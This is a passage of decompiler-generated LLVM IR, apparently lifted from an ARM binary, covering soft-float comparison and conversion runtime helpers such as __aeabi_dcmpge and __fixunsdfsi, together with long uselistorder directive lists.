  uselistorder i32* @r2, { 13, 44, 45, 46, 47, 2, 48, 49, 50, 51, 52, 53, 10, 54, 93, 94, 98, 11, 100, 101, 102, 103, 104, 112, 119, 120, 121, 122, 123, 124, 17, 125, 126, 127, 55, 56, 20, 99, 18, 19, 97, 128, 129, 130, 12, 33, 9, 145, 146, 147, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 137, 67, 68, 69, 70, 95, 96, 148, 152, 153, 154, 155, 1, 158, 105, 106, 107, 108, 109, 3, 149, 4, 5, 110, 111, 6, 7, 138, 114, 71, 72, 73, 74, 34, 86, 113, 0, 156, 8, 157, 75, 76, 77, 79, 78, 80, 81, 82, 83, 115, 116, 117, 84, 85, 118, 150, 151, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40, 41, 42, 43, 87, 88, 14, 15, 16, 89, 90, 91, 92, 131, 132, 133, 134, 135, 136, 139, 140, 141, 142, 143, 144 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1ac90 = call i32 @__aeabi_cdcmple()
  %v0_1ac94 = load i1, i1* @cpsr_z, align 1
  %.v0_1ac90. = zext i1 %v0_1ac94 to i32
  ret i32 %.v0_1ac90.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1aca8 = call i32 @__aeabi_cdcmple()
  %v0_1acac = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1acac to i32
  %.v0_1aca8. = xor i32 %tmp2, 1
  ret i32 %.v0_1aca8.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1acc0 = call i32 @__aeabi_cdcmple()
  %v0_1acc4 = load i1, i1* @cpsr_z, align 1
  %v1_1acc4 = load i1, i1* @cpsr_c, align 1
  %v2_1acc4 = xor i1 %v1_1acc4, true
  %v3_1acc4 = or i1 %v0_1acc4, %v2_1acc4
  %.v0_1acc0 = select i1 %v3_1acc4, i32 1, i32 %v0_1acc0
  %v2_1acc8 = xor i1 %v0_1acc4, true
  %v3_1acc8 = and i1 %v1_1acc4, %v2_1acc8
  %..v0_1acc0 = select i1 %v3_1acc8, i32 0, i32 %.v0_1acc0
  ret i32 %..v0_1acc0

; uselistorder directives
  uselistorder i1 %v1_1acc4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1acd4 = load i32, i32* @lr, align 4
  store i32 %v0_1acd4, i32* %stack_var_-8, align 4
  %v0_1acd8 = call i32 @__aeabi_cdrcmple()
  %v0_1acdc = load i1, i1* @cpsr_z, align 1
  %v1_1acdc = load i1, i1* @cpsr_c, align 1
  %v2_1acdc = xor i1 %v1_1acdc, true
  %v3_1acdc = or i1 %v0_1acdc, %v2_1acdc
  %.v0_1acd8 = select i1 %v3_1acdc, i32 1, i32 %v0_1acd8
  %v2_1ace0 = xor i1 %v0_1acdc, true
  %v3_1ace0 = and i1 %v1_1acdc, %v2_1ace0
  %..v0_1acd8 = select i1 %v3_1ace0, i32 0, i32 %.v0_1acd8
  %v2_1ace4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ace4, i32* @lr, align 4
  ret i32 %..v0_1acd8

; uselistorder directives
  uselistorder i1 %v1_1acdc, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 101, 1, 92, 7, 8, 9, 10, 11, 12, 84, 85, 93, 94, 86, 13, 14, 15, 87, 88, 89, 95, 16, 17, 18, 19, 22, 21, 20, 103, 104, 105, 106, 107, 108, 109, 90, 110, 111, 112, 97, 113, 114, 115, 116, 91, 117, 118, 119, 120, 121, 122, 123, 23, 124, 102, 125, 24, 25, 26, 27, 98, 30, 31, 32, 33, 28, 29, 99, 34, 100, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 96, 126, 63, 64, 65, 66, 2, 67, 68, 82, 69, 70, 71, 72, 83, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i1* @cpsr_z, { 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 0, 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 10, 11, 12, 13, 14, 15, 40, 41, 42, 43, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* @lr, { 22, 23, 24, 25, 26, 7, 8, 9, 10, 11, 27, 0, 28, 1, 29, 30, 31, 55, 56, 60, 61, 62, 66, 67, 68, 69, 70, 71, 72, 73, 76, 86, 87, 80, 88, 89, 90, 91, 92, 93, 94, 95, 12, 96, 97, 98, 106, 99, 100, 101, 102, 103, 104, 105, 32, 63, 64, 65, 21, 134, 135, 136, 137, 138, 139, 140, 141, 142, 81, 82, 57, 58, 59, 33, 34, 35, 36, 37, 38, 39, 40, 41, 54, 13, 14, 113, 114, 115, 16, 17, 52, 53, 109, 143, 144, 116, 117, 118, 119, 120, 77, 78, 79, 121, 122, 123, 124, 125, 126, 127, 2, 128, 129, 131, 132, 130, 107, 108, 18, 19, 20, 83, 84, 85, 42, 43, 44, 45, 46, 47, 3, 4, 48, 49, 50, 51, 15, 74, 75, 112, 133, 5, 6, 110, 111 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1acf0 = call i32 @__aeabi_cdrcmple()
  %v0_1acf4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1acf4 to i32
  %.v0_1acf0. = xor i32 %tmp2, 1
  ret i32 %.v0_1acf0.

; uselistorder directives
  uselistorder i32 1, { 579, 592, 687, 593, 580, 1061, 1006, 1062, 688, 145, 148, 147, 151, 150, 146, 144, 149, 1063, 689, 1064, 690, 14, 16, 12, 13, 15, 411, 128, 127, 550, 93, 691, 412, 413, 1065, 1066, 11, 10, 1067, 501, 502, 503, 692, 90, 91, 86, 87, 88, 89, 1127, 505, 1128, 1134, 603, 1135, 1136, 693, 118, 119, 120, 117, 123, 121, 122, 694, 82, 81, 1137, 604, 605, 1140, 1154, 697, 696, 695, 416, 415, 417, 414, 1156, 698, 115, 116, 1157, 551, 1158, 1159, 699, 73, 74, 1160, 700, 75, 197, 196, 171, 1161, 702, 701, 169, 168, 167, 703, 139, 606, 1162, 1163, 1164, 522, 1165, 586, 552, 1166, 1167, 525, 1168, 1169, 706, 705, 704, 420, 419, 421, 418, 707, 424, 423, 422, 1170, 1171, 1172, 1181, 1182, 1183, 1190, 607, 608, 716, 715, 714, 713, 686, 712, 711, 710, 709, 708, 426, 427, 429, 428, 430, 425, 1193, 717, 113, 111, 112, 114, 581, 1218, 1219, 574, 1220, 1222, 506, 1223, 610, 570, 569, 609, 1224, 517, 534, 567, 587, 1225, 1226, 1227, 1228, 1229, 0, 1232, 1221, 611, 1233, 576, 725, 677, 724, 723, 722, 721, 720, 719, 718, 353, 352, 350, 351, 1234, 1235, 1236, 1237, 1238, 507, 1239, 726, 347, 349, 346, 343, 342, 344, 348, 345, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 553, 1015, 1016, 730, 729, 728, 727, 267, 268, 269, 270, 1017, 1018, 1019, 1020, 1021, 733, 732, 731, 361, 356, 360, 363, 359, 358, 357, 355, 364, 362, 554, 1240, 555, 1241, 1242, 1243, 1244, 1, 1245, 1246, 1247, 1248, 1249, 1250, 735, 734, 134, 133, 136, 137, 132, 138, 135, 594, 1251, 1252, 1253, 1254, 1255, 736, 230, 229, 231, 233, 232, 1194, 737, 431, 432, 433, 738, 288, 739, 41, 43, 42, 44, 740, 179, 178, 180, 1068, 1069, 1070, 741, 436, 438, 437, 434, 435, 742, 26, 27, 24, 30, 28, 25, 29, 32, 37, 31, 36, 40, 39, 35, 38, 33, 34, 743, 100, 99, 97, 96, 98, 94, 95, 744, 101, 102, 109, 110, 106, 107, 105, 108, 103, 104, 439, 386, 385, 293, 292, 556, 1256, 1257, 1276, 1277, 746, 745, 218, 220, 221, 219, 526, 575, 527, 1314, 1315, 1316, 1317, 557, 747, 306, 1049, 1050, 213, 214, 535, 1141, 1383, 1142, 1143, 1144, 536, 1051, 1146, 1145, 513, 748, 1052, 749, 441, 442, 443, 440, 1071, 537, 1072, 1385, 538, 1386, 1387, 1388, 1389, 1390, 1391, 991, 1392, 1393, 1394, 1395, 1396, 1397, 992, 678, 751, 750, 247, 248, 253, 255, 254, 249, 246, 250, 252, 251, 612, 1195, 1196, 1202, 1203, 752, 679, 125, 126, 1147, 1148, 753, 130, 129, 539, 558, 1073, 1074, 1075, 613, 1076, 523, 559, 518, 540, 1077, 614, 1078, 1079, 1080, 2, 1081, 511, 1082, 508, 1083, 615, 1084, 1085, 1086, 560, 1087, 766, 765, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755, 680, 754, 199, 208, 198, 200, 211, 203, 201, 204, 202, 209, 212, 206, 205, 207, 210, 1301, 1302, 379, 377, 382, 384, 380, 381, 378, 383, 131, 519, 767, 56, 57, 768, 55, 1197, 1198, 1199, 769, 51, 53, 52, 54, 48, 47, 49, 50, 1088, 771, 770, 18, 20, 19, 21, 22, 23, 561, 588, 774, 773, 772, 616, 1155, 775, 302, 1149, 1150, 1151, 1152, 1153, 617, 776, 395, 398, 396, 397, 399, 618, 63, 1022, 777, 338, 619, 778, 296, 620, 779, 275, 273, 274, 780, 301, 300, 299, 781, 366, 365, 92, 782, 387, 783, 376, 375, 784, 85, 83, 84, 785, 388, 786, 264, 263, 787, 444, 788, 445, 789, 307, 790, 791, 174, 175, 1398, 621, 1399, 1400, 622, 792, 69, 64, 70, 67, 65, 71, 68, 72, 66, 295, 623, 298, 297, 793, 446, 447, 448, 794, 1327, 1328, 797, 796, 795, 276, 290, 520, 1003, 1004, 1005, 798, 1026, 801, 800, 799, 222, 802, 528, 1176, 529, 1177, 1178, 521, 1179, 450, 451, 449, 452, 454, 453, 455, 1180, 530, 1023, 191, 194, 193, 192, 195, 1129, 562, 1130, 804, 803, 155, 153, 152, 159, 157, 158, 156, 154, 805, 164, 166, 162, 160, 161, 163, 165, 806, 308, 313, 309, 312, 311, 314, 310, 807, 808, 1401, 563, 624, 810, 809, 811, 1331, 1334, 1335, 1336, 812, 456, 461, 462, 460, 459, 463, 457, 458, 1337, 1338, 1339, 1340, 813, 468, 474, 467, 473, 472, 466, 476, 475, 470, 464, 469, 465, 471, 1332, 1333, 625, 315, 317, 316, 1184, 626, 1185, 1186, 1187, 1188, 1189, 814, 59, 60, 58, 61, 1341, 1342, 1343, 1344, 1345, 1346, 582, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 628, 1355, 1356, 1357, 1358, 1359, 627, 1360, 1361, 1362, 1363, 1364, 815, 236, 238, 234, 237, 242, 244, 241, 243, 245, 239, 240, 235, 281, 280, 629, 630, 1027, 524, 819, 818, 817, 816, 339, 62, 541, 282, 820, 341, 340, 291, 821, 303, 822, 367, 823, 402, 181, 824, 173, 172, 825, 403, 826, 827, 354, 1303, 1304, 829, 828, 477, 478, 1209, 830, 1294, 1295, 3, 124, 1089, 1090, 831, 479, 1138, 1139, 542, 1384, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 832, 285, 283, 284, 286, 287, 1230, 1231, 215, 216, 543, 1091, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 217, 1192, 1191, 993, 994, 995, 996, 997, 998, 999, 1402, 182, 183, 184, 185, 80, 631, 833, 1207, 1204, 1205, 1206, 571, 544, 337, 333, 334, 335, 336, 1201, 834, 186, 188, 189, 190, 187, 632, 1200, 836, 835, 483, 481, 484, 480, 482, 485, 1028, 837, 289, 1208, 838, 279, 278, 277, 1029, 839, 78, 77, 79, 76, 577, 1092, 1093, 634, 1094, 1095, 1096, 1097, 1098, 635, 1099, 1100, 1101, 1102, 1103, 636, 1105, 565, 564, 1104, 633, 1106, 1107, 637, 1108, 1109, 1110, 844, 681, 843, 842, 841, 840, 321, 319, 320, 324, 328, 318, 325, 326, 322, 327, 323, 1111, 845, 487, 491, 489, 490, 486, 488, 545, 846, 226, 225, 1112, 1113, 1114, 331, 332, 329, 330, 578, 512, 1116, 1117, 531, 1118, 1119, 4, 5, 1120, 1122, 514, 1123, 639, 1124, 532, 1121, 638, 856, 855, 854, 853, 852, 851, 850, 849, 848, 847, 390, 392, 391, 640, 546, 857, 140, 141, 142, 1115, 589, 682, 858, 492, 1024, 859, 370, 369, 371, 374, 372, 368, 373, 641, 1025, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 547, 862, 861, 860, 494, 493, 497, 496, 495, 498, 566, 864, 863, 865, 1173, 1174, 1175, 867, 866, 45, 46, 868, 257, 256, 869, 259, 260, 870, 258, 871, 499, 872, 224, 223, 266, 265, 272, 271, 873, 406, 405, 874, 294, 875, 876, 408, 407, 877, 404, 261, 878, 500, 389, 879, 880, 177, 176, 881, 393, 882, 228, 227, 509, 1365, 410, 409, 1030, 515, 533, 1031, 1032, 1033, 510, 644, 1034, 1035, 1036, 583, 1037, 1038, 1039, 1040, 1041, 642, 643, 584, 645, 1042, 889, 888, 887, 886, 885, 884, 883, 1043, 1044, 896, 895, 894, 893, 892, 683, 891, 890, 646, 1045, 1046, 898, 897, 1047, 1048, 647, 648, 899, 1053, 1054, 649, 905, 904, 903, 902, 901, 900, 400, 1055, 1056, 650, 1057, 1058, 1059, 1060, 911, 910, 909, 908, 907, 906, 401, 1125, 915, 914, 913, 912, 1126, 920, 919, 918, 917, 916, 1131, 651, 1000, 1001, 654, 1002, 652, 653, 990, 1132, 1133, 929, 928, 927, 926, 925, 924, 923, 922, 921, 305, 304, 655, 656, 657, 933, 932, 931, 930, 595, 1278, 934, 937, 936, 935, 6, 658, 572, 939, 938, 590, 1286, 659, 660, 1288, 1287, 661, 942, 941, 940, 596, 1289, 1290, 662, 663, 664, 1296, 684, 1291, 665, 943, 591, 666, 667, 1292, 668, 1293, 951, 950, 949, 948, 947, 946, 945, 944, 597, 1297, 1298, 598, 952, 953, 1299, 669, 1300, 956, 955, 954, 958, 957, 960, 959, 568, 1305, 1306, 1307, 670, 516, 1308, 1309, 1310, 671, 1311, 964, 963, 962, 961, 685, 1312, 262, 1313, 143, 965, 600, 1318, 1319, 599, 1320, 1321, 601, 602, 1322, 1323, 966, 1324, 7, 8, 1326, 1325, 672, 969, 968, 967, 673, 1329, 1330, 971, 970, 974, 973, 972, 977, 976, 975, 979, 978, 1366, 1367, 674, 1376, 1377, 573, 1378, 981, 980, 585, 9, 985, 984, 983, 982, 549, 1368, 1369, 1370, 548, 1371, 1374, 1375, 675, 986, 676, 1372, 1373, 987, 17, 1379, 1380, 170, 1381, 1382, 394, 988, 989, 504 }
  uselistorder i1 false, { 37, 13, 14, 11, 15, 50, 51, 52, 53, 54, 55, 8, 9, 12, 56, 57, 58, 10, 38, 35, 39, 40, 41, 42, 43, 3, 16, 17, 36, 1, 30, 59, 0, 21, 22, 23, 44, 18, 20, 45, 46, 47, 48, 49, 32, 2, 5, 60, 19, 24, 27, 26, 25, 28, 6, 7, 29, 4, 34, 31, 33, 61, 62, 63, 64 }
  uselistorder i1* @cpsr_c, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1ad04 = icmp slt i32 %arg2, 0
  %v2_1ad04 = mul i32 %arg2, 2
  br i1 %v1_1ad04, label %dec_label_pc_1ad38, label %dec_label_pc_1ad0c

dec_label_pc_1ad0c:                               ; preds = %entry
  %v1_1ad0c = add i32 %v2_1ad04, 2097152
  %v2_1ad0c = icmp ugt i32 %v2_1ad04, -2097153
  br i1 %v2_1ad0c, label %dec_label_pc_1ad40, label %dec_label_pc_1ad14

dec_label_pc_1ad14:                               ; preds = %dec_label_pc_1ad0c
  %v6_1ad0c = icmp slt i32 %v1_1ad0c, 0
  br i1 %v6_1ad0c, label %dec_label_pc_1ad18, label %dec_label_pc_1ad38

dec_label_pc_1ad18:                               ; preds = %dec_label_pc_1ad14
  %v4_1ad1c = sdiv i32 %v1_1ad0c, 2097152
  %v5_1ad1c = sub nsw i32 -993, %v4_1ad1c
  %v11_1ad1c = icmp slt i32 %v5_1ad1c, 0
  br i1 %v11_1ad1c, label %dec_label_pc_1ad48, label %dec_label_pc_1ad24

dec_label_pc_1ad24:                               ; preds = %dec_label_pc_1ad18
  %v3_1ad24 = mul i32 %arg2, 2048
  %v4_1ad2c = udiv i32 %arg1, 2097152
  %v1_1ad28 = or i32 %v4_1ad2c, %v3_1ad24
  %v5_1ad2c = or i32 %v1_1ad28, -2147483648
  %v6_1ad30 = lshr i32 %v5_1ad2c, %v5_1ad1c
  ret i32 %v6_1ad30

dec_label_pc_1ad38:                               ; preds = %dec_label_pc_1ad14, %entry
  ret i32 0

dec_label_pc_1ad40:                               ; preds = %dec_label_pc_1ad0c
  %v4_1ad40 = mul i32 %arg2, 4096
  %v5_1ad40 = or i32 %v4_1ad40, %arg1
  %v7_1ad40 = icmp eq i32 %v5_1ad40, 0
  br i1 %v7_1ad40, label %dec_label_pc_1ad48, label %dec_label_pc_1ad50

dec_label_pc_1ad48:                               ; preds = %dec_label_pc_1ad40, %dec_label_pc_1ad18
  ret i32 -1

dec_label_pc_1ad50:                               ; preds = %dec_label_pc_1ad40
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 44, 278, 185, 186, 47, 48, 45, 46, 187, 49, 1, 188, 189, 190, 191, 2, 192, 193, 3, 4, 194, 86, 195, 87, 327, 167, 329, 88, 330, 149, 297, 331, 332, 5, 89, 333, 334, 196, 197, 146, 198, 155, 90, 6, 199, 343, 76, 77, 344, 200, 150, 201, 152, 202, 7, 203, 154, 153, 345, 346, 66, 67, 68, 69, 71, 78, 8, 9, 74, 279, 10, 11, 12, 92, 96, 91, 93, 143, 144, 97, 95, 94, 168, 280, 98, 337, 99, 298, 204, 299, 300, 281, 282, 283, 100, 284, 285, 347, 348, 205, 50, 51, 301, 206, 84, 52, 207, 302, 53, 13, 54, 208, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 209, 338, 340, 210, 101, 303, 212, 304, 305, 85, 79, 80, 306, 307, 308, 309, 310, 156, 102, 311, 157, 14, 211, 81, 82, 213, 312, 351, 352, 214, 169, 170, 313, 215, 216, 314, 315, 171, 328, 217, 16, 15, 218, 219, 17, 286, 220, 103, 386, 104, 105, 295, 106, 362, 75, 363, 107, 358, 108, 287, 109, 110, 356, 18, 111, 364, 365, 19, 221, 222, 223, 224, 366, 336, 173, 172, 112, 288, 73, 225, 113, 289, 226, 20, 227, 21, 228, 174, 367, 25, 229, 230, 24, 26, 368, 23, 231, 232, 55, 22, 233, 56, 57, 58, 59, 234, 235, 236, 70, 291, 292, 27, 357, 114, 349, 115, 116, 296, 117, 369, 118, 353, 119, 120, 294, 121, 350, 72, 237, 316, 238, 60, 61, 239, 240, 241, 242, 243, 122, 244, 245, 246, 175, 123, 247, 28, 248, 147, 124, 339, 249, 317, 250, 251, 318, 319, 62, 320, 321, 83, 322, 252, 253, 148, 158, 151, 323, 29, 254, 324, 255, 30, 63, 256, 64, 325, 342, 335, 176, 125, 359, 126, 388, 127, 341, 128, 129, 370, 130, 290, 131, 390, 132, 326, 133, 387, 134, 355, 135, 293, 136, 354, 137, 138, 139, 360, 140, 389, 141, 361, 257, 258, 142, 177, 259, 260, 261, 262, 35, 36, 37, 31, 32, 33, 34, 178, 179, 263, 264, 265, 38, 266, 267, 65, 39, 40, 145, 180, 181, 182, 41, 268, 269, 164, 165, 166, 42, 270, 159, 160, 161, 162, 163, 43, 271, 272, 273, 274, 275, 276, 277, 183, 184 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 22, 5, 6, 23, 7, 8, 9, 10, 24, 28, 11, 14, 31, 15, 29, 18, 30, 16, 13, 25, 17, 19, 20, 26, 27, 12, 21 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 181, 37, 38, 39, 161, 40, 41, 42, 43, 44, 197, 198, 199, 201, 202, 203, 93, 204, 45, 126, 205, 206, 207, 46, 127, 208, 209, 210, 123, 94, 128, 213, 0, 216, 162, 163, 95, 129, 217, 130, 176, 47, 177, 218, 219, 220, 48, 182, 183, 184, 164, 200, 221, 222, 223, 224, 49, 50, 96, 97, 98, 239, 240, 114, 241, 242, 99, 243, 244, 214, 185, 92, 186, 187, 51, 52, 188, 189, 131, 132, 53, 175, 54, 100, 55, 56, 112, 178, 90, 57, 245, 113, 230, 58, 59, 231, 60, 61, 91, 211, 62, 63, 64, 212, 65, 66, 67, 68, 115, 232, 233, 69, 70, 1, 165, 234, 71, 235, 225, 166, 2, 72, 73, 74, 101, 102, 103, 117, 104, 118, 105, 106, 133, 107, 109, 108, 110, 167, 168, 169, 190, 191, 124, 75, 76, 77, 78, 79, 125, 192, 119, 116, 80, 193, 194, 195, 215, 170, 81, 82, 83, 171, 84, 85, 86, 87, 88, 134, 179, 135, 136, 137, 138, 120, 180, 139, 140, 121, 141, 142, 143, 144, 145, 146, 148, 172, 147, 173, 151, 149, 150, 174, 160, 152, 196, 153, 154, 155, 226, 227, 228, 156, 229, 111, 157, 158, 159, 238, 122, 236, 89, 237 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1ad5c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1ad5c)
  %v31_1ad64 = load i32, i32* @r0, align 4
  ret i32 %v31_1ad64

; uselistorder directives
  uselistorder i32* @r0, { 34, 215, 209, 210, 211, 212, 213, 214, 35, 32, 216, 94, 217, 5, 95, 218, 219, 93, 96, 220, 36, 33, 221, 222, 223, 224, 133, 37, 134, 135, 38, 39, 225, 226, 227, 228, 229, 230, 28, 231, 232, 40, 6, 279, 281, 115, 280, 2, 292, 291, 49, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 305, 306, 307, 319, 320, 321, 322, 323, 324, 325, 326, 118, 327, 136, 328, 329, 330, 332, 331, 18, 311, 233, 234, 137, 138, 41, 42, 43, 333, 334, 335, 336, 337, 44, 19, 46, 369, 20, 47, 21, 22, 283, 3, 284, 206, 207, 208, 7, 314, 50, 235, 236, 90, 91, 237, 238, 239, 92, 240, 241, 242, 51, 243, 244, 245, 246, 52, 70, 282, 285, 286, 287, 288, 289, 290, 53, 54, 139, 140, 141, 55, 56, 57, 58, 355, 349, 59, 370, 356, 372, 373, 123, 124, 125, 126, 127, 128, 129, 130, 60, 61, 62, 131, 132, 371, 304, 72, 275, 276, 277, 8, 278, 9, 142, 10, 11, 143, 358, 63, 121, 122, 359, 12, 360, 361, 362, 308, 116, 309, 310, 117, 74, 363, 364, 365, 366, 367, 350, 149, 64, 338, 45, 346, 71, 247, 248, 249, 65, 23, 66, 48, 313, 67, 250, 251, 252, 13, 14, 253, 254, 15, 17, 0, 1, 255, 256, 16, 257, 258, 259, 69, 113, 260, 261, 262, 263, 264, 68, 265, 24, 266, 267, 4, 268, 312, 144, 145, 146, 147, 148, 315, 316, 317, 318, 269, 270, 150, 344, 73, 151, 357, 152, 97, 153, 154, 155, 98, 156, 99, 100, 101, 102, 157, 158, 159, 160, 103, 104, 161, 162, 163, 164, 165, 105, 106, 107, 31, 27, 108, 166, 167, 168, 169, 170, 30, 26, 109, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 29, 25, 110, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 111, 204, 205, 112, 114, 271, 272, 273, 274, 339, 340, 341, 342, 343, 345, 347, 348, 351, 352, 353, 354, 119, 120, 368, 75, 76, 77, 85, 86, 87, 88, 89, 78, 79, 80, 81, 82, 83, 84 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 81, 82, 83, 33, 34, 44, 45, 46, 95, 41, 42, 43, 35, 16, 17, 18, 19, 20, 21, 100, 101, 102, 103, 104, 96, 87, 97, 98, 99, 0, 38, 39, 40, 22, 23, 24, 25, 26, 27, 84, 85, 86, 105, 106, 107, 88, 89, 90, 55, 56, 57, 91, 92, 93, 108, 64, 65, 66, 67, 68, 69, 70, 71, 72, 58, 59, 60, 61, 62, 63, 29, 30, 73, 74, 31, 32, 36, 37, 28, 75, 76, 77, 78, 79, 80, 47, 48, 49, 50, 51, 52, 53, 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 94 }
  uselistorder i32 0, { 0, 1575, 1, 1576, 1577, 1361, 435, 436, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 3, 4, 5, 1585, 1586, 2, 1587, 1588, 1362, 6, 1589, 1590, 34, 1363, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 106, 105, 217, 218, 219, 1599, 1600, 1601, 7, 1602, 1603, 35, 1604, 1605, 1606, 36, 37, 210, 1607, 1608, 1609, 1610, 38, 211, 447, 1611, 1612, 1613, 1614, 1615, 1616, 39, 1617, 9, 8, 40, 1364, 1618, 1366, 1365, 1619, 1620, 1621, 1622, 1623, 10, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1367, 1432, 1624, 1625, 1626, 1627, 1628, 11, 1629, 1368, 1630, 1631, 1632, 1633, 212, 213, 448, 1634, 1635, 13, 12, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1369, 1370, 1643, 1372, 1644, 1645, 1373, 1374, 1646, 1647, 1371, 1648, 1375, 1649, 1376, 1650, 1651, 1652, 1653, 14, 1841, 1842, 1843, 1844, 134, 1845, 220, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 221, 1377, 1380, 1378, 1379, 1853, 1854, 1855, 1856, 1857, 1858, 1865, 1866, 54, 55, 1875, 1876, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1877, 1878, 1885, 1880, 1881, 1883, 1882, 1884, 112, 222, 1908, 1915, 223, 1916, 125, 1917, 126, 1918, 127, 1919, 128, 1920, 224, 1921, 1922, 1654, 1655, 1926, 1927, 225, 1928, 1929, 1930, 226, 1931, 1932, 86, 89, 90, 113, 1933, 87, 1934, 88, 1935, 1936, 1937, 145, 146, 1938, 1939, 1940, 227, 1941, 1942, 385, 1943, 1944, 449, 1945, 1946, 1947, 1948, 1949, 1950, 1951, 91, 1952, 1953, 114, 1968, 1969, 1970, 1971, 1972, 1973, 331, 1974, 1975, 1976, 1986, 1977, 2021, 2041, 2042, 2043, 1985, 147, 2044, 391, 381, 382, 450, 2045, 2046, 2047, 2049, 2050, 2051, 2052, 41, 2053, 2054, 56, 2055, 2056, 2057, 2058, 2061, 2062, 2063, 2064, 2065, 2066, 228, 2067, 2068, 1381, 2069, 2059, 2048, 1382, 328, 1383, 2060, 2070, 2071, 2072, 2073, 57, 2075, 58, 2074, 148, 2076, 2077, 229, 1433, 1434, 1435, 1436, 1437, 115, 1438, 1439, 230, 42, 231, 1440, 451, 1441, 383, 232, 233, 452, 453, 235, 2078, 2079, 2080, 2081, 2082, 236, 234, 454, 455, 2083, 2084, 2085, 2086, 237, 456, 2087, 457, 2088, 59, 60, 61, 62, 437, 238, 2089, 129, 2090, 240, 239, 458, 459, 135, 1987, 1988, 1989, 1990, 1991, 1656, 1657, 1658, 1659, 1660, 1661, 241, 107, 384, 1662, 1663, 1664, 92, 1992, 460, 1993, 1994, 1995, 149, 1665, 461, 1666, 1667, 1668, 1669, 1670, 1671, 392, 393, 1444, 1445, 1923, 1924, 394, 1925, 462, 1442, 463, 1443, 1451, 1452, 15, 150, 151, 249, 248, 242, 243, 251, 250, 245, 247, 246, 244, 1909, 1910, 1911, 1912, 464, 2091, 2092, 2093, 252, 2094, 2098, 2099, 2100, 2101, 2102, 253, 2103, 152, 2147, 2148, 2149, 2150, 255, 254, 256, 2151, 1886, 1887, 1888, 332, 2248, 93, 333, 2252, 2253, 121, 63, 153, 1384, 1672, 64, 154, 1673, 1674, 334, 1546, 1547, 335, 65, 1889, 116, 257, 1548, 1549, 155, 1385, 337, 1675, 66, 122, 1676, 1677, 336, 2254, 2255, 2256, 2257, 2258, 2261, 2262, 2263, 2264, 2265, 2266, 2267, 2268, 2269, 2270, 2259, 2260, 2271, 2272, 2273, 2274, 2275, 2276, 2277, 2278, 43, 2279, 2280, 2281, 2282, 2283, 44, 2284, 2285, 2286, 45, 2287, 2288, 2289, 46, 2290, 2291, 2292, 2293, 2294, 2295, 2296, 2297, 2298, 2299, 2300, 2301, 2302, 2303, 2304, 2305, 2306, 2307, 2308, 2309, 2310, 2311, 2312, 2313, 2316, 2317, 